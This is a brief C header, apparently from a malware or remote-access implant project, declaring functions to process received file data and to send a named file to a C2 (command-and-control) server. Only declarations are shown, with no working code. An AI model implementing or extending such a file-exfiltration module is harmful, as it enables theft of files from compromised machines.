#ifndef HERE_IS_JOHNNY_V_FILE_TRANSFER_COMMANDS_H
#define HERE_IS_JOHNNY_V_FILE_TRANSFER_COMMANDS_H

/**
 * Process the received fileToObserve data.
 * @param data The received fileToObserve data.
 */
void process_received_file(const char* data);

/**
 * Send a fileToObserve to C2.
 * @param file_name The name of the fileToObserve to send.
 */
void send_file(const char *file_name);

#endif //HERE_IS_JOHNNY_V_FILE_TRANSFER_COMMANDS_H
